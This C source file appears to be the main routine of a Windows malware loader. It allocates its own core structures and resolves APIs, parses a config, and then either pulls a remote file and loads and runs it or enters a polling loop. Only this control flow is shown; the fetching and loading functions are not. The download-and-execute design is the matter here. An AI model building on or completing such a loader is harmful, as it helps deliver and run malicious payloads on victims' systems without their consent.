#include "../../includes/core/core.h"
#include "../../includes/loader/loader.h"

LdrInstance *ldr = NULL;



void LdrMain() {
#ifdef DEBUG 
	AllocConsole();
#endif
	if(!LdrAllocateCoreStructsAndLoadApis()) {
		DBGA("[!] Failed Allocating structs and apis\n");
		LdrExitThread(0);
	}
	
	DBGA("[*] Allocation done, Parsing config\n");

	if(!ParseConfig()) {
		DBGA("[!] Failed Parsing config\n");
		LdrExitThread(0);
	}


#ifdef LOAD_AND_EXIT
	DBGA("[+] Pulling file...\n");
	LdrInfo loaderInfo = LdrPullFile();
	if(!loaderInfo.ok) {
		DBGA("[!] Failed Pulling file\n");
		LdrExitThread(0);
	}

	if(!LdrLoadAndRun(loaderInfo, FALSE)) {
		DBGA("[!] Failed Loading file\n");
		LdrExitThread(0);
	}
#else
	DBGA("[*] Going into poll Loop\n");
#endif
		
}